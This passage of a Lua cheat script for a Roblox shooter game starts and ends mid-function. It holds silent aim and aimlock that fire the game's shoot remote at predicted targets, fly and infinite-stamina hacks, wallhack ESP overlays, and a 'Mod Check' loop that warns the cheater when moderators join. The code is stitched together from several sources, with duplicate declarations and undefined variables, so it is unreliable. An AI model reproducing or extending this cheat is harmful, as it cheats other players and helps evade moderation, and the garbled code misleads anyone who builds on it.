            jig[i] = {v.R,v.G,v.B}
        elseif typeof(v) == "EnumItem" then
            jig[i] = {string.split(tostring(v),".")[2],string.split(tostring(v),".")[3]}
        else
            jig[i] = v
        end
    end
    writefile("OsirisCFGS/"..name..".cfg",game:GetService("HttpService"):JSONEncode(jig))
    library:notify("Succesfully created config "..name..".cfg!")
    library:refreshConfigs()
end

function library:saveConfig()
    local name = library.flags["selected_config"]
    local jig = {}
    for i,v in next, library.flags do
        if library.options[i].skipflag then continue end
        if typeof(v) == "Color3" then
            jig[i] = {v.R,v.G,v.B}
        elseif typeof(v) == "EnumItem" then
            jig[i] = {string.split(tostring(v),".")[2],string.split(tostring(v),".")[3]}
        else
            jig[i] = v
        end
    end
    writefile("OsirisCFGS/"..name..".cfg",game:GetService("HttpService"):JSONEncode(jig))
    library:notify("Succesfully updated config "..name..".cfg!")
    library:refreshConfigs()
end

function library:loadConfig()
    local name = library.flags["selected_config"]
    if not isfile("OsirisCFGS/"..name..".cfg") then
        library:notify("Config file not found!")
        return
    end
    local config = game:GetService("HttpService"):JSONDecode(readfile("OsirisCFGS/"..name..".cfg"))
    for i,v in next, library.options do
        spawn(function()pcall(function()
            if config[i] then
                if v.type == "colorpicker" then
                    v.changeState(Color3.new(config[i][1],config[i][2],config[i][3]))
                elseif v.type == "keybind" then
                    v.changeState(Enum[config[i][1]][config[i][2]])
                else
                    if config[i] ~= library.flags[i] then
                        v.changeState(config[i])
                    end
                end
            else
                if v.type == "toggle" then
                    v.changeState(false)
                elseif v.type == "slider" then
                    v.changeState(v.args.value or 0)
                elseif v.type == "textbox" or v.type == "list" or v.type == "cfg" then
                    v.changeState(v.args.value or v.args.text or "")
                elseif v.type == "colorpicker" then
                    v.changeState(v.args.color or Color3.new(1,1,1))
                elseif option.type == "list" then
                    v.changeState("")
                elseif option.type == "keybind" then
                    v.changeState(v.args.key or Enum.KeyCode.Unknown)
                end
            end
        end)end)
    end
    library:notify("Succesfully loaded config "..name..".cfg!")
end

function library:refreshConfigs()
    local tbl = {}
    for i,v in next, listfiles("OsirisCFGS") do
        table.insert(tbl,v)
    end
    library.options["selected_config"].refresh(tbl)
end

function library:deleteConfig()
    if isfile("OsirisCFGS/"..library.flags["selected_config"]..".cfg") then
        delfile("OsirisCFGS/"..library.flags["selected_config"]..".cfg")
        library:refreshConfigs()
    end
end

-- // Variables
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")
local plrs = game:GetService("Players")
local ws = game:GetService("Workspace")
--
local plr = plrs.LocalPlayer

-- // Services \\ --
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local InputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local Gui = game:GetService("GuiService")

-- // Variables \\ --
local load = tick()
local LocalPlayer = Players.LocalPlayer
local CurrentCamera = Workspace.CurrentCamera
local MapLightingJmp = Instance.new("ColorCorrectionEffect")
local Mouse = LocalPlayer:GetMouse()
local IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, InputService:GetPlatform())
local Connections = {}
local Flags = {}

do --// ESP 
    Flags.ESPBox       = false;
    Flags.ESPVest      = false;
    Flags.ESPReloading = false;
    Flags.ESPName      = false;
    Flags.ESPDistance  = false;
    Flags.ESPWeapon    = false;
    Flags.ESPAmmo      = false;
    Flags.ESPHealth    = false;
    Flags.ESPHealthbar = false;
    Flags.ESPHighlight = false;

    Flags.HighlightFillTransparency = 1;
    Flags.HighlightOutlineTransparency = 0;
    Flags.HighlightFillColor    = Color3.fromRGB(100, 95, 192);
    Flags.HighlightOutlineColor = Color3.fromRGB(255, 255, 255);

    Flags.BoxColor     = Color3.fromRGB(100, 95, 192);
    Flags.TextColor    = Color3.fromRGB(255, 255, 255);
    Flags.VestColor    = Color3.fromRGB(100, 95, 192);
    Flags.ReloadColor  = Color3.fromRGB(100, 95, 192);
    Flags.HealthHigher = Color3.fromRGB(0, 255, 0);
    Flags.HealthLower  = Color3.fromRGB(255, 0, 0);
end;

local Circle = Drawing.new("Circle")
Circle.Radius = silent.fov.size * 3
Circle.Visible = silent.fov.visible
Circle.Color = Color3.new(1,1,1)
Circle.Thickness = 1
Circle.NumSides = 25

function get_pred()
    local PingStats = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    local Value = tostring(PingStats)
    local PingValue = Value:split(" ")
    local PingNumber = tonumber(PingValue[1])
    return tonumber(PingNumber / 225 * 0.1 + 0.1)
end

CheckDistance = function(Player)
    if (Player.Character:FindFirstChild("HumanoidRootPart").Position - game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude > silent.dist then 
        return true
    else
        return false
    end
end

OnScreen = function(Object)
    local _, screen = CurrentCamera:WorldToScreenPoint(Object.Position)
    return screen
end

WTS = function(Object)
	local ObjectVector = CurrentCamera:WorldToScreenPoint(Object.Position)
	return v2.new(ObjectVector.X, ObjectVector.Y)
end


FilterObjs = function(Object)
    if string.find(Object.Name, "Gun") then
        return
    end
    if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
        return true
    end
end


RayCastCheck = function(Part, PartDescendant)
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded.Wait(LocalPlayer.CharacterAdded)
    local Origin = CurrentCamera.CFrame.Position

    local RayCastParams = RaycastParams.new()
    RayCastParams.FilterType = Enum.RaycastFilterType.Blacklist
    RayCastParams.FilterDescendantsInstances = {Character, CurrentCamera}

    local Result = Workspace.Raycast(Workspace, Origin, Part.Position - Origin, RayCastParams)
    
    if (Result) then
        local PartHit = Result.Instance
        local Visible = (not PartHit or Instance.new("Part").IsDescendantOf(PartHit, PartDescendant))
        
        return Visible
    end
    return false
end

GetMagnitudeFromMouse = function(Part)
    local PartPos, OnScreen = CurrentCamera:WorldToScreenPoint(Part.Position)
    if OnScreen then
        local Magnitude = (Vector2.new(PartPos.X, PartPos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
        return Magnitude
    end
    return math.huge
end

GetClosestPlayer = function()
    local Target = nil
    local Closest = math.huge
    for _, v in pairs(Players:GetPlayers()) do
        if v.Character and v ~= LocalPlayer and v.Character:FindFirstChild("HumanoidRootPart") then
            if not OnScreen(v.Character.HumanoidRootPart) then 
                continue 
            end
            if silent.visible and not RayCastCheck(v.Character.HumanoidRootPart, v.Character) then 
                continue 
            end
            if silent.friend and game.Players.LocalPlayer:IsFriendsWith(v.UserId) then
                continue
            end
            if silent.distance and CheckDistance(v) then
                continue
            end
            local Distance = GetMagnitudeFromMouse(v.Character.HumanoidRootPart)
            if (Distance < Closest and silent.fov.size * 3 + Distance * 0.3 > Distance) then
                Closest = Distance
                Target = v
            end
        end
    end
    silent.target = Target
end

local function MainEvent()
    for _, v in pairs(game.ReplicatedStorage:GetChildren()) do
        if v.Name == "MainEvent" or v.Name == "Bullets" or v.Name == ".gg/untitledhood" or v.Name == "Remote" or v.Name == "MAINEVENT" then
            return v
        end
    end
end

GetClosestBodyPart = function()
    local character = silent.target.Character
    local ClosestDistance = 1 / 0
    local BodyPart = nil
    if (character and character:GetChildren()) then
        for _, x in next, character:GetChildren() do
            if FilterObjs(x) and OnScreen(x) then
                local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
                    if (Distance < ClosestDistance) then
                        ClosestDistance = Distance
                        BodyPart = x
                    end
            end
        end
    end
    silent.part = tostring(BodyPart)
end


function GetClosestPointOfPart(Part)
    local mouseray = Mouse.UnitRay
    mouseray = mouseray.Origin + (mouseray.Direction * (Part.Position - mouseray.Origin).Magnitude)
    local point =
        (mouseray.Y >= (Part.Position - Part.Size / 2).Y and mouseray.Y <= (Part.Position + Part.Size / 2).Y) and
            (Part.Position + Vector3.new(0, -Part.Position.Y + mouseray.Y, 0)) or Part.Position
    local check = RaycastParams.new()
    check.FilterType = Enum.RaycastFilterType.Whitelist
    check.FilterDescendantsInstances = {Part}
    local ray = game:GetService("Workspace"):Raycast(mouseray, (point - mouseray), check)
    if ray then
        return ray.Position
    else
        return Mouse.Hit.Position
    end
end

do --// Utility functions 

    Utility.WDown = false;
    Utility.ADown = false;
    Utility.SDown = false;
    Utility.DDown = false;

    function Utility:Tween(...)
        local NewTween = game:GetService("TweenService"):Create(...)
        NewTween:Play();
        return NewTween;
    end;


    function Utility:FindPlayer(Player)
        Player = Player:lower();
        local FoundPlayers = {};
        for Index, Value in next, Players:GetPlayers() do 
            if Value and Value ~= Client then 
                local Name = Value.Name:lower();
                local DisplayName = Value.DisplayName:lower(); 
                if Name == Player then 
                    table.insert(FoundPlayers, Value);
                    break;
                end;
                    
                if string.sub(Name, 1, #Player) == Player or string.sub(DisplayName, 1, #Player) == Player then 
                    table.insert(FoundPlayers, Value);
                end;
            end;
        end
            
        return FoundPlayers;
    end;

    function Utility:FireAimlock()
        local Tool = Client.Character:FindFirstChildOfClass("Tool");
        if Tool and Tool:FindFirstChild("Shoot") then 
            local Target = Utility.AimlockTarget.Character;
            local Part = Target:FindFirstChild(Flags.AimPart);
            local AimAt = nil;

            if Part then
                local Velocity = Part.Velocity;
                if Flags.YPrediction == false then 
                    Velocity = Vector3.new(Velocity.X, 0, Velocity.Z);
                end;

                if Flags.AimlockMode == "default" or Flags.AimlockMode == "velocity" then 
                    AimAt = Part.CFrame + Velocity / Flags.AimVelocity + Velocity / math.huge
                end;

                if Flags.AimlockMode == "movedirection" then 
                    Velocity = Part:GetAttribute("CalculatedVelocity");
                    if not Velocity then 
                        Velocity = Vector.new(0, 0, 0);
                    end;

                    if Flags.YPrediction == false then 
                        Velocity = Vector3.new(Velocity.X, 0, Velocity.Z);
                    end;

                    local Humanoid = Target:FindFirstChildOfClass("Humanoid");
                    local MoveDirection = Humanoid.MoveDirection;
                    
                    if MoveDirection.Magnitude ~= 0 then 
                        AimAt = Part.CFrame + Humanoid.MoveDirection * (Velocity.Unit + Vector3.new(Ping / 1000, Ping / 1000, Ping / 1000))
                    else 
                        AimAt = Part.CFrame;
                    end;
                end;

                Tool.Shoot:FireServer(AimAt);
            end;
        end;
    end;

    function Utility:Fly()
        local Torso = Client.Character:FindFirstChild("Torso");
        
        local BodyVelocity, BodyGyro = Instance.new("BodyVelocity", Torso), Instance.new("BodyGyro", Torso);

        BodyVelocity.Velocity = Vector3.new(0, 0.1, 0);
        BodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9);
        
        BodyGyro.CFrame = Torso.CFrame;
        BodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9);
        BodyGyro.P = 9e4;
        Utility.BodyGyro = BodyGyro;
        Utility.BodyVelocity = BodyVelocity;
        task.spawn(function()
            repeat wait() until Utility.Flying ~= true
            BodyGyro:Destroy();
            BodyVelocity:Destroy();
        end);
    end;

    function Utility:ApplyHitmarker(Player)
        local Character = Player.Character;
            
        if Character then 
            local Humanoid = Character:WaitForChild("Humanoid");
            Humanoid.ChildAdded:Connect(function(Creator)
                task.wait(0.1);
                if Creator.Name == "creator" then 
                    if tostring(Creator.Value) == Client.Name and Flags.Hitmarkers and Player.Character:FindFirstChild("Head") then
                        Utility.Hitmarker:Play();
                        VisualsModule:NewHitmarker(Player.Character:FindFirstChild("Head").Position);
                        local Distance = math.floor((Camera.CFrame.p - Player.Character:FindFirstChild("HumanoidRootPart").CFrame.p).Magnitude);
                        --Notifications:New("You hit "..Player.Name .. " from "..tostring(Distance) .. " studs away");
                    end;
                end;
            end);
        end;

        Player.CharacterAdded:Connect(function()
            task.spawn(function()
                repeat Character = Player.Character until Character ~= nil;
                local Humanoid = Character:WaitForChild("Humanoid");
                Humanoid.ChildAdded:Connect(function(Creator)
                    task.wait(0.1);
                    if Creator.Name == "creator" then 
                        if tostring(Creator.Value) == Client.Name and Flags.Hitmarkers then
                            Utility.Hitmarker:Play();
                            VisualsModule:NewHitmarker(Player.Character:FindFirstChild("Head").Position);
                            local Distance = math.floor((Camera.CFrame.p - Player.Character:FindFirstChild("HumanoidRootPart").CFrame.p).Magnitude);
                            --Notifications:New("You hit "..Player.Name .. " from "..tostring(Distance) .. " studs away");
                        end;
                    end;
                end);
            end);
        end);
    end;
    
    function Utility:CharacterAdded()
        repeat task.wait() until Client.Character;
        local Humanoid = Client.Character:WaitForChild("Humanoid");
        repeat wait() until Humanoid ~= nil;

        if Utility.Flying then 
            Utility:Fly();
        end;

        if Flags.DeathTP and HasInit then
            Client.Character:WaitForChild("HumanoidRootPart").CFrame = LastDeathPosition;
        end;

        do --// connections 
            Client.Character.DescendantAdded:Connect(function(Instance)
                if Instance.Name == "Bone" then
                    if Flags.QuickRespawn then
                        Client.Character.Humanoid.Health = 0;
                        Client.Character.Humanoid:ChangeState(15);
                    end;
                    LastDeathPosition = Client.Character:WaitForChild("HumanoidRootPart").CFrame;
                end;

                if Instance.Name == "creator" then
                    if Flags.AttackerWarnings then
                        local Player = Players:FindFirstChild(tostring(Instance.Value));
                        local Character = Player.Character;
                        local Tool = Character:FindFirstChildOfClass("Tool") and Character:FindFirstChildOfClass("Tool").Name or "None";
                        if Tool ~= "None" then 
                            --Notifications:New("You were attacked by "..tostring(Instance.Value) .. " using a "..Tool, 4);
                        else 
                            --Notifications:New("You were attacked by "..tostring(Instance.Value), 4);
                        end;
                    end;
                end;
            end);

            Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
                if Humanoid.Health == 0 then 
                    if Flags.QuickRespawn then
                        Client.Character.Humanoid:ChangeState(15);
                    end;
                    LastDeathPosition = Client.Character:WaitForChild("HumanoidRootPart").CFrame;
                end;
            end);

            local Stam = Client.Character:WaitForChild("Stam");
            Stam:GetPropertyChangedSignal("Value"):Connect(function()
                if Flags.InfiniteStamina then 
                    Stam.Value = 100;
                end;
            end);
        end;

    end;
end;

do --// Player Functions 
    PlayerFunctions.__index = PlayerFunctions;
    function PlayerFunctions:GetCharacter()
        local Character = self.Player.Character;

        return Character;
    end;

    function PlayerFunctions:CheckGamepass(ID)
        return MarketplaceService:UserOwnsGamePassAsync(self.Player.UserId, ID)
    end;

    function PlayerFunctions:GetRoot()
        local Character = self:GetCharacter();
        if Character then
            if Character:FindFirstChild("HumanoidRootPart") then 
                return Character:FindFirstChild("HumanoidRootPart");
            end

            if Character:FindFirstChild("Torso") then 
                return Character:FindFirstChild("Torso");
            end;

            return Character.PrimaryPart;
        end;
        return nil;
    end;

    function PlayerFunctions:GetDistance()
        local Character = self:GetCharacter();
        if Character then 
            local Root = self:GetRoot();

            if Root then 
                return math.floor((Camera.CFrame.p - Root.CFrame.p).Magnitude);
            end;
        end;
        return 0;
    end;

    function PlayerFunctions:GetName()
        return self.Player.Name;
    end;

    function PlayerFunctions:GetWeapon()
        local Character = self:GetCharacter();
        if Character then 
            local Tool = Character:FindFirstChildOfClass("Tool");
            if Tool then 
                return Tool, Tool.Name;
            end;
        end;

        return nil, "None"
    end;

    function PlayerFunctions:GetHealth()
        local Character = self:GetCharacter();
        if Character and Character:FindFirstChildOfClass("Humanoid") then 
            return Character:FindFirstChildOfClass("Humanoid").Health, Character:FindFirstChildOfClass("Humanoid").MaxHealth;
        end;
        return 0, 100
    end;

    function PlayerFunctions:GetAmmo()
        local Character = self:GetCharacter();
        if Character and self:GetWeapon() then 
            local Tool, ToolName = self:GetWeapon();

            if table.find(self.GunNames, ToolName) then 
                local Ammo  = Tool:FindFirstChild("Ammo");
                local Clips = Tool:FindFirstChild("Clips");

                if Ammo and Clips then 
                    return Ammo.Value, Clips.Value;
                end;
            end;
        end;

        return 0, 0
    end;

    function PlayerFunctions:GetBoundingBox()
        local Root = self:GetRoot();

		local BoxInfo = {};
		local RootPos, IsOnScreen = Camera:WorldToViewportPoint(Root.Position);

		local SF = 1 / (RootPos.Z * math.tan(math.rad(Camera.FieldOfView / 2)) * 2) * 1000; 
		local Width = 4 * SF;
		local Height = 7 * SF;

		BoxInfo.Width = Width;
		BoxInfo.Height = Height;

		local Size, Pos = VisualsModule:FloorVector(Vector2.new(math.max(Width, 7), math.max(Height, 12))), VisualsModule:FloorVector(Vector2.new(RootPos.X - Width / 2, (RootPos.Y - 1) - Height / 2));
		local Center = Vector2.new(Pos.X + Size.X / 2, Pos.Y + Size.Y / 2);

		BoxInfo.BoxSize = Size;
		BoxInfo.BoxPos = Pos;
		BoxInfo.Center = Center;
		BoxInfo.IsOnScreen = IsOnScreen;

		return BoxInfo;
    end;

    function PlayerFunctions:SetInvisible()
        local Components = self.Components;

        if Components.Name then 
            Components.Name.Visible      = false;
            Components.Reloading.Visible = false;
            Components.Weapon.Visible    = false;
            Components.Ammo.Visible      = false;
            Components.Distance.Visible  = false;
            Components.Health.Visible    = false;
            Components.Vest.Visible      = false;

            Components.Box.Visible        = false;
            Components.BoxOutline.Visible = false;

            Components.HealthbarOutline.Visible = false;
            Components.Healthbar.Visible        = false;
        end;
    end;

    function PlayerFunctions:CheckVest()
        if self:GetCharacter():FindFirstChild("BulletResist") then 
            return true;
        end;
        return false;
    end;

    function PlayerFunctions:Update()
        local Character  = self:GetCharacter() 
        local Components = self.Components;
        local Player     = self.Player;
        local Highlight  = self.Highlight;

        --// Components 
        local Box        = Components.Box;
        local BoxOutline = Components.BoxOutline;
        
        --// Textlabels
        local Name      = Components.Name;
        local Distance  = Components.Distance;
        local Health    = Components.Health;
        local Reloading = Components.Reloading;
        local Weapon    = Components.Weapon;
        local Ammo      = Components.Ammo;
        local Vest      = Components.Vest;
        --// Healthbar 
        local Healthbar        = Components.Healthbar;
        local HealthbarOutline = Components.HealthbarOutline;

        --// Updating 
        if Character and Character:FindFirstChildOfClass("Humanoid") and self:GetRoot() then 
            --// Data 
            local PlayerName         = self:GetName();
            local CurrentAmmo, Clips = self:GetAmmo();
            local Magnitude          = self:GetDistance();
            local Root               = self:GetRoot();
            local BoxInfo            = self:GetBoundingBox();
            local HasVest            = self:CheckVest();
            local PlayerWeapon, WeaponName  = self:GetWeapon();
            local CurrentHealth, MaxHealth  = self:GetHealth();

            local BoxSize, BoxPosition, BoxCenter, IsOnScreen = BoxInfo.BoxSize, BoxInfo.BoxPos, BoxInfo.BoxCenter, BoxInfo.IsOnScreen;

            --// Offsets 
            local TopOffset    = VisualsModule:FloorVector(Vector2.new(BoxSize.X / 2 + BoxPosition.X, BoxPosition.Y  - 16));
            local BottomOffset = VisualsModule:FloorVector(Vector2.new(BoxSize.X / 2 + BoxPosition.X, BoxSize.Y + BoxPosition.Y + 1));
            local RightOffset  = Vector2.new(BoxPosition.X + BoxSize.X + 8, BoxPosition.Y - 1)
            local LeftOffset   = Vector2.new(BoxPosition.X - 28, (BoxPosition.Y + BoxSize.Y) -1 * BoxSize.Y);

            --// Bounds
            local TopBounds    = 0
            local LeftBounds   = 0
            local BottomBounds = 0
            local RightBounds  = 0
            
            if Root and IsOnScreen and Box then 
                if Flags.ESPBox then --// Box 
                    BoxOutline.Visible  = true;
                    BoxOutline.Position = BoxPosition;
                    BoxOutline.Size     = BoxSize;

                    Box.Color    = Flags.BoxColor;
                    Box.Visible  = true;
                    Box.Size     = BoxSize;
                    Box.Position = BoxPosition;
                else 
                    Box.Visible = false;
                    BoxOutline.Visible = false;
                end;

                do --// Text 

                    if Flags.ESPName then --// Name
                        Name.Visible  = true;
                        Name.Text     = PlayerName;
                        Name.Position = TopOffset + Vector2.new(0, TopBounds);
                        Name.Color    = Flags.TextColor;
                        TopBounds = TopBounds - 14;
                    else 
                        Name.Visible = false;
                    end; 

                    if Flags.ESPDistance then --// Distance
                        Distance.Visible  = true;
                        Distance.Text     = tostring(Magnitude) .. " studs";
                        Distance.Position = BottomOffset + Vector2.new(0, BottomBounds);
                        Distance.Color    = Flags.TextColor
                        BottomBounds = BottomBounds + 14;
                    else 
                        Distance.Visible = false;
                    end; 

                    if Flags.ESPWeapon then --// Weapon 
                        if Weapon then
                            Weapon.Visible  = true;
                            Weapon.Text     = WeaponName;
                            Weapon.Position = BottomOffset + Vector2.new(0, BottomBounds);
                            Weapon.Color    = Flags.TextColor;

                            BottomBounds = BottomBounds + 14;
                        else 
                            Weapon.Visible = false;
                        end;
                    else 
                        Weapon.Visible = false;
                    end;

                    if Flags.ESPAmmo then --// Ammo 
                        Ammo.Position  = BottomOffset + Vector2.new(0, BottomBounds);
                        Ammo.Text     = "Ammo: "..tostring(CurrentAmmo) .. " | Clips: "..tostring(Clips);
                        Ammo.Visible  = true;
                        Ammo.Color = Flags.TextColor;
                        BottomBounds = BottomBounds + 14;
                    else 
                        Ammo.Visible = false;
                    end;

                    if Flags.ESPVest then --// Vest 
                        Vest.Position = RightOffset + Vector2.new(0, RightBounds);
                        Vest.Center = false;

                        if HasVest then 
                            Vest.Visible = true;
                            Vest.Text    = "VEST";
                            Vest.Color   = Flags.VestColor;
                            RightBounds  = RightBounds + 14;
                        else 
                            Vest.Visible = false;
                        end;
                    else 
                        Vest.Visible = false;
                    end;

                    if Flags.ESPReloading then --// Reloading 
                        Reloading.Position = RightOffset + Vector2.new(0, RightBounds);
                        Reloading.Center = false;
                        if PlayerWeapon and PlayerWeapon:FindFirstChild("Reloader") then 
                            if PlayerWeapon.Reloader.Value then 
                                Reloading.Text    = "Reloading";
                                Reloading.Color   = Color3.fromRGB(100, 95, 192)
                                Reloading.Visible = true;
                            else 
                                Reloading.Visible = false;
                            end;
                        else 
                            Reloading.Visible = false;
                        end;

                        RightBounds = RightBounds + 14;
                    else 
                        Reloading.Visible = false;
                    end;

                    if Flags.ESPHealth then --// Health 
                        Health.Text     = tostring(math.floor(CurrentHealth));
                        Health.Position = LeftOffset + Vector2.new(0, LeftBounds);
                        Health.Visible  = true;

                        LeftBounds = LeftBounds + 14;
                    else 
                        Health.Visible = false;
                    end;    
                end;
                
                if Flags.ESPHealthbar then --// Healthbar
                    local From = Vector2.new(BoxPosition.X - 5, BoxPosition.Y + BoxSize.Y);
                    local To   = Vector2.new(From.X, From.Y - (CurrentHealth / MaxHealth) * BoxSize.Y);

                    Healthbar.Color = Flags.HealthLower:lerp(Flags.HealthHigher, CurrentHealth / MaxHealth);

                    Healthbar.Visible        = true;
                    HealthbarOutline.Visible = true;

                    Healthbar.From = From;
                    Healthbar.To   = To;

                    HealthbarOutline.From = Vector2.new(From.X, BoxPosition.Y + BoxSize.Y) + Vector2.new(0, 1);
                    HealthbarOutline.To   = Vector2.new(From.X, From.Y - 1 * BoxSize.Y) + Vector2.new(0, -1);
                else 
                    Healthbar.Visible = false;
                    HealthbarOutline.Visible = false;
                end;

                if Flags.ESPHighlight then --// Highlight
                    Highlight.FillTransparency    = Flags.HighlightFillTransparency;
                    Highlight.OutlineTransparency = Flags.HighlightOutlineTransparency;
                    Highlight.OutlineColor        = Flags.HighlightOutlineColor;
                    Highlight.FillColor           = Flags.HighlightFillColor;
                    Highlight.Adornee = Character;
                    Highlight.Enabled = true;
                else 
                    Highlight.Enabled = false;
                end;
            else 
                --// Make everything invisible
                self:SetInvisible()
            end;
        else 
            --// Make everything invisible
            self:SetInvisible()
        end;
    end;
end;

do --// Visuals functions
    VisualsModule.ESPCache = {};
    VisualsModule.Hitmarkers = {}; 
    function VisualsModule:FloorVector(Vector)
		if typeof(Vector) == "Vector2" then 
			return Vector2.new(math.floor(Vector.X), math.floor(Vector.Y));
		else 
			return Vector3.new(math.floor(Vector.X), math.floor(Vector.Y), math.floor(Vector.Z));
		end;
	end;

    function VisualsModule:Draw(Class, Properties)
        local NewDrawing = Drawing.new(Class);
        task.spawn(function()
            for Index, Value in next, Properties do
                pcall(function()
                    NewDrawing[Index] = Value;
                end)
            end;
        end);
        return NewDrawing;
    end;

    function VisualsModule:NewLabel()
        local TextLabel = VisualsModule:Draw("Text", {
            Text = "",
            Font = 2,
            Size = 13,
            Outline = true,
            Center = true,
            Color = Color3.new(1, 1, 1);
        });
        return TextLabel;
    end;

    function VisualsModule:NewBox()
        local BoxOutline = VisualsModule:Draw("Square", {
            Color = Color3.new(0, 0, 0),
            Filled = false;
            Thickness = 3,
        });
        local Box = VisualsModule:Draw("Square", {
            Color = Color3.new(1, 1, 1),
            Filled = false;
            Thickness = 1,
        });

        return Box, BoxOutline;
    end;

    function VisualsModule:New(Player)
        if not VisualsModule.ESPCache[Player] then
            local Components = {};
            local Highlight  = Instance.new("Highlight", Lighting);

            task.spawn(function()
                do --// Highlight 
                    Highlight.FillTransparency = 1;
                    Highlight.OutlineTransparency = 0;
                    Highlight.OutlineColor = Color3.fromRGB(255, 255, 255);
                    Highlight.DepthMode = "AlwaysOnTop";
                end;

                do --// Box
                    local Box, BoxOutline = VisualsModule:NewBox();
                    Components.Box = Box;
                    Components.BoxOutline = BoxOutline;
                end;

                do --// Text 
                    Components.Name      = VisualsModule:NewLabel();
                    Components.Distance  = VisualsModule:NewLabel();
                    Components.Health    = VisualsModule:NewLabel();
                    Components.Weapon    = VisualsModule:NewLabel();
                    Components.Ammo      = VisualsModule:NewLabel();
                    Components.Reloading = VisualsModule:NewLabel();
                    Components.Vest      = VisualsModule:NewLabel();
                end;

                do --// Healthbar 
                    Components.HealthbarOutline = VisualsModule:Draw("Line", {
                        Thickness = 3,
                        Color = Color3.new(0, 0, 0),
                    });

                    Components.Healthbar = VisualsModule:Draw("Line", {
                        Thickness = 1,
                        Color = Color3.new(0, 1, 0),
                    });
                end;
            end);
            local Info = setmetatable({
                Components = Components,
                Player = Player,
                GunNames = {"Uzi", "Shotty", "Glock"},
                Highlight = Highlight,
            }, PlayerFunctions)

            VisualsModule.ESPCache[Player] = Info;
            return Info;
        end;
    end;

    function VisualsModule:Remove(Player)
        if VisualsModule.ESPCache[Player] then 
            for Index, Value in next, VisualsModule.ESPCache[Player].Components do 
                Value:Remove();
            end;

            VisualsModule.ESPCache[Player].Highlight:Destroy();
            VisualsModule.ESPCache[Player] = nil;
        end;
    end;

    function VisualsModule:NewHitmarker(Position)
        local Index = #VisualsModule.Hitmarkers + 1;
        VisualsModule.Hitmarkers[Index] = {
            Time = tick();
            Position = Position;
            Drawings = {
                [1] = VisualsModule:Draw("Line", {
                    Thickness = 1.5,
                    ZIndex = 9000,
                    Color = Flags.HitmarkerColor,
                }),
                [2] = VisualsModule:Draw("Line", {
                    Thickness = 1.5,
                    ZIndex = 9000,
                    Color = Flags.HitmarkerColor,
                }),
                [3] = VisualsModule:Draw("Line", {
                    Thickness = 1.5,
                    ZIndex = 9000,
                    Color = Flags.HitmarkerColor,
                }),
                [4] = VisualsModule:Draw("Line", {
                    Thickness = 1.5,
                    ZIndex = 9000,
                    Color = Flags.HitmarkerColor,
                }),
            };
        };

        task.spawn(function()
            task.wait(1);
            for i = 1, 0, -0.1 do 
                task.wait(0.05);
                VisualsModule.Hitmarkers[Index].Drawings[1].Transparency = i;
                VisualsModule.Hitmarkers[Index].Drawings[2].Transparency = i;
                VisualsModule.Hitmarkers[Index].Drawings[3].Transparency = i;
                VisualsModule.Hitmarkers[Index].Drawings[4].Transparency = i;
            end;
            VisualsModule.Hitmarkers[Index].Drawings[1]:Remove();
            VisualsModule.Hitmarkers[Index].Drawings[2]:Remove();
            VisualsModule.Hitmarkers[Index].Drawings[3]:Remove();
            VisualsModule.Hitmarkers[Index].Drawings[4]:Remove();
            VisualsModule.Hitmarkers[Index] = nil;
        end);
    end;
    
    VisualsModule.WeaponInfo = VisualsModule:NewLabel();
    VisualsModule.PredCircle = VisualsModule:Draw("Square", {
        Thickness = 0,
        Size = Vector2.new(100, 0),
        Filled = false;
        Color = Color3.new(1, 1, 1),
        ZIndex = 9000,
    });
end;

-- Legit tab
local aimbotTab = library:addTab("Legit")

-- Aiming group
local aimingGroup = aimbotTab:createGroup('left', 'Aiming')
--mod checker
local GroupId = 33986332
local NotificationMessagePrefix = "MOD INGAME: "
local notificationEnabled = false
local notificationConnection
local playersInGroup = {} 

local function sendNotification()
    local playersList = {}
    
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player:IsInGroup(GroupId) then
            table.insert(playersList, player.DisplayName) -- Store display names
        end
    end

    -- Sort players by their join order (assuming they joined when the game started)
    table.sort(playersList)

    if #playersList > 0 then
        local combinedMessage = NotificationMessagePrefix .. table.concat(playersList, ", ")
        
        -- Send the notification with combined message
        local success, _ = pcall(function()
            game.StarterGui:SetCore("SendNotification", {
                Title = "Watch Out!!",
                Text = combinedMessage,
                Duration = 5 -- Notification visible for 5 seconds
            })
        end)

        if not success then
            warn("Failed to send notification")
        end
    end
end

local function startNotificationLoop()
    while notificationEnabled do
        sendNotification() -- Call the notification function
        
        wait(5) -- Wait for 5 seconds before checking again
    end
end

local function toggleNotification(value)
    notificationEnabled = value
    if notificationEnabled then
        startNotificationLoop()
    else
        -- If toggled off, clear the player list or handle accordingly.
        playersInGroup = {}
    end
end

-- Assuming aimingGroup is already defined in your GUI library/code.
aimingGroup:addToggle({
    text = "Mod Check",
    flag = "modcheck",
    default = true,
    callback = function(value)
        toggleNotification(value)
    end
})

aimingGroup:addList({text = "Mode", flag = "SilentMode", values = {"FOV", "Target"}, callback = function(value)
    silent.mode = value
end})

aimingGroup:addList({text = "Target Bind", flag = "TargetBind", values = shared.keys, callback = function(value)
    silent.key = Enum.KeyCode[value]
end})

aimingGroup:addButton({
    text = "Resovler", 
    callback = function()
        
        local RunService = game:GetService("RunService")

local function zeroOutYVelocity(hrp)
    hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
    hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        local hrp = character:WaitForChild("HumanoidRootPart")
        zeroOutYVelocity(hrp)
    end)
end

local function onPlayerRemoving(player)
    player.CharacterAdded:Disconnect()
end

game.Players.PlayerAdded:Connect(onPlayerAdded)
